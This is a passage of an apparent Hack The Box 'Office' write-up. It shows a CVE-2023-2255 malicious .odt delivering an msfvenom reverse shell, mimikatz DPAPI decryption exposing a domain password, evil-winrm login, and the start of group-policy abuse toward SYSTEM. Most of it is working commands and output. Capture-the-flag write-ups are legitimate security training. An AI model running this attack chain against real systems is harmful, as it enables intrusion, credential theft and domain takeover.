<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>chisel client 10.10.16.59:4444 R:8083:127.0.0.1:8083
</span></span></code></pre></div><p>Here&rsquo;s the http service.</p>
<p><img src="images/http-service.png" alt="alt text"></p>
<p>And here&rsquo;s the <code>resume.php</code>.</p>
<p><img src="images/resume.png" alt="alt text"></p>
<p>Privilege Escalation to <code>ppots</code> via <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-2255">CVE-2023-2255</a></p>
<h3 id="cve-2023-2255"><strong>CVE-2023-2255</strong></h3>
<p>After doing a research I realized this exploit was exactly what I was looking for.</p>
<p>I create a shell.exe file to get a reverse shell via msfvenom:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>  msfvenom <span style="color:#ff79c6">-</span>p windows<span style="color:#ff79c6">/</span>shell_reverse_tcp LHOST<span style="color:#ff79c6">=</span>tun0 LPORT<span style="color:#ff79c6">=</span><span style="color:#bd93f9">9001</span> <span style="color:#ff79c6">-</span>f exe <span style="color:#ff79c6">-</span>o shell<span style="color:#ff79c6">.</span>exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [<span style="color:#ff79c6">-</span>] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [<span style="color:#ff79c6">-</span>] No arch selected, selecting arch: x86 from the payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  No encoder specified, outputting raw payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Payload size: <span style="color:#bd93f9">324</span> bytes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Final size of exe file: <span style="color:#bd93f9">73802</span> bytes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Saved as: shell<span style="color:#ff79c6">.</span>exe
</span></span></code></pre></div><p>I create the exploit.odt file and transfer it to the following directory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  python3 CVE-2023-2255.py --cmd &#39;C:\programdata\shell.exe&#39; --output &#39;exploit.odt&#39;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  File exploit.odt has been created !
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  C:\xampp\htdocs\internal\applications\exploit.odt
</span></span></code></pre></div><p>After waiting few seconds I get reverse shell as PPotts user.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  rlwrap nc -lvnp 9001
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  listening on [any] 9001 ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  connect to [10.10.15.29] from (UNKNOWN) [10.10.11.3] 53622
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Microsoft Windows [Version 10.0.20348.2322]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  (c) Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  C:\Program Files\LibreOffice 5\program&gt;whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  office\ppotts
</span></span></code></pre></div><h3 id="shell-as-hhogan-using-mimikatz"><strong>Shell as HHogan</strong> using <em>mimikatz</em></h3>
<p>Enumerate the credentials folders:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  PS C:\Users\PPotts\AppData\Roaming\Microsoft\credentials&gt; Get-ChildItem -Hidden C:\Users\ppotts\AppData\Roaming\Microsoft\Credentials\
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Directory: C:\Users\ppotts\AppData\Roaming\Microsoft\Credentials
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Mode                 LastWriteTime         Length Name                                                                 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ----                 -------------         ------ ----                                                                 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  -a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E                                     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  -a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4                                     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  -a-hs-         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF7
</span></span></code></pre></div><p>I use dpapi feature via mimikatz:</p>
<p>DPAPI (Data Protection API) is an API used for data protection and encryption operations in the Microsoft Windows operating system.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\XXXXXXXXXXX
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  **BLOB**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwVersion          : 00000001 - 1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwMasterKeyVersion : 00000001 - 1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwFlags            : 20000000 - 536870912 (system ; )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwDescriptionLen   : 0000003a - 58
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    szDescription      : Enterprise Credential Data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    algCrypt           : 00006603 - 26115 (CALG_3DES)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwAlgCryptLen      : 000000c0 - 192
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwSaltLen          : 00000010 - 16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwHmacKeyLen       : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbHmackKey         : 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    algHash            : 00008004 - 32772 (CALG_SHA1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwAlgHashLen       : 000000a0 - 160
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwHmac2KeyLen      : 00000010 - 16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwDataLen          : 000000c0 - 192
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwSignLen          : 00000014 - 20
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976
</span></span></code></pre></div><p>I know I might need the guidMasterKey so I&rsquo;m keeping it temporarily.</p>
<p>Now I&rsquo;ll enumarate this directory and got a SID number:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  PS C:\Users\PPotts\appdata\roaming\microsoft\protect&gt; dir
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Directory: C:\Users\PPotts\appdata\roaming\microsoft\protect
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Mode                 LastWriteTime         Length Name                                                                 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ----                 -------------         ------ ----                                                                 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  d---s-         1/17/2024   3:43 PM                S-1-5-21-1199398058-4196589450-691661856-1107
</span></span></code></pre></div><p>Change SID and guidMasterKey to your own:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  dpapi::masterkey /in:C:\Users\PPotts\appdata\roaming\microsoft\protect\\ /rpc
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  mimikatz # dpapi::masterkey /in:C:\Users\PPotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  **MASTERKEYS**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwVersion          : 00000002 - 2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    szGuid             : {191d3f9d-7959-4b4d-a520-a444853c47eb}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwFlags            : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwMasterKeyLen     : 00000088 - 136
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwBackupKeyLen     : 00000068 - 104
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwCredHistLen      : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwDomainKeyLen     : 00000174 - 372
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [masterkey]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    **MASTERKEY**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      dwVersion        : 00000002 - 2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      salt             : c521daa0857ee4fa6e4246266081e94c
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      rounds           : 00004650 - 18000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      algHash          : 00008009 - 32777 (CALG_HMAC)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      algCrypt         : 00006603 - 26115 (CALG_3DES)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      pbKey            : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [backupkey]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    **MASTERKEY**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      dwVersion        : 00000002 - 2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      salt             : a2741b13d7261697be4241ebbe05098a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      rounds           : 00004650 - 18000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      algHash          : 00008009 - 32777 (CALG_HMAC)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      algCrypt         : 00006603 - 26115 (CALG_3DES)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      pbKey            : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [domainkey]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    **DOMAINKEY**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      dwVersion        : 00000002 - 2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      dwSecretLen      : 00000100 - 256
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      dwAccesscheckLen : 00000058 - 88
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      guidMasterKey    : {e523832a-e126-4d6e-ac04-ed10da72b32f}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      pbSecret         : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      pbAccesscheck    : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [backupkey] without DPAPI_SYSTEM: 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    key : 4d1b2c18baba7442e79d33cc771bf54027ae2500e08da3ecfccf91303bd471b6
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sha1: eeb787c4259e3c8b8408201ee5e54fc29fad22b2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [domainkey] with RPC
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [DC] &#39;office.htb&#39; will be the domain
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  [DC] &#39;DC.office.htb&#39; will be the DC server
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
</span></span></code></pre></div><p>After using the this command I see the password of HHogan</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\XXXXXXXXXXXXX /guidMasterkey::
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /191d3f9d-7959-4b4d-a520-a444853c47eb::87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  **BLOB**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwVersion          : 00000001 - 1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwMasterKeyVersion : 00000001 - 1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwFlags            : 20000000 - 536870912 (system ; )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwDescriptionLen   : 0000003a - 58
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    szDescription      : Enterprise Credential Data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    algCrypt           : 00006603 - 26115 (CALG_3DES)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwAlgCryptLen      : 000000c0 - 192
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwSaltLen          : 00000010 - 16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwHmacKeyLen       : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbHmackKey         : 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    algHash            : 00008004 - 32772 (CALG_SHA1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwAlgHashLen       : 000000a0 - 160
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwHmac2KeyLen      : 00000010 - 16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwDataLen          : 000000c0 - 192
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dwSignLen          : 00000014 - 20
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Decrypting Credential:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  * volatile cache: GUID:{191d3f9d-7959-4b4d-a520-a444853c47eb};KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77;Key:available
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  **CREDENTIAL**
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    credFlags      : 00000030 - 48
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    credSize       : 000000be - 190
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    credUnk0       : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Type           : 00000002 - 2 - domain_password
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Flags          : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    LastWritten    : 5/9/2023 11:03:21 PM
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    unkFlagsOrSize : 00000018 - 24
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Persist        : 00000003 - 3 - enterprise
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    AttributeCount : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    unk0           : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    unk1           : 00000000 - 0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    TargetName     : Domain:interactive=OFFICE\HHogan
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    UnkData        : (null)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Comment        : (null)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    TargetAlias    : (null)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    UserName       : OFFICE\HHogan
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    CredentialBlob : H4ppyFtW183#
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Attributes     : 
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  evil-winrm -u &#34;hhogan&#34; -p &#34;H4ppyFtW183#&#34; -i 10.10.11.3     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Evil-WinRM shell v3.5
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  *Evil-WinRM* PS C:\Users\HHogan\Documents&gt;
</span></span></code></pre></div><h3 id="shell-as-system"><strong>Shell as system</strong></h3>
<p>I see that HHogan is in the GPO Managers group and can write to the default domain group policy. This ability allows an attacker to perform a wide variety of attacks, they can execute commands via scheduled tasks, disable or modify system services, elevate privileges and more.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; whoami /groups
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>GROUP INFORMATION
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Group Name                                  Type             SID                                           Attributes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>=========================================== ================ ============================================= ==================================================
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OFFICE\GPO Managers                         Group            S-1-5-21-1199398058-4196589450-691661856-1117 Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; Get-GPO -All | Select-Object -ExpandProperty DisplayName
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Windows Firewall GPO
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Default Domain Policy
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Default Active Directory Settings GPO
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Default Domain Controllers Policy
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Windows Update GPO
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Windows Update Domain Policy
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Software Installation GPO
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Password Policy 
</span></span></code></pre></div><p>Now I add it to the computer as a local administrator via GPO.</p>
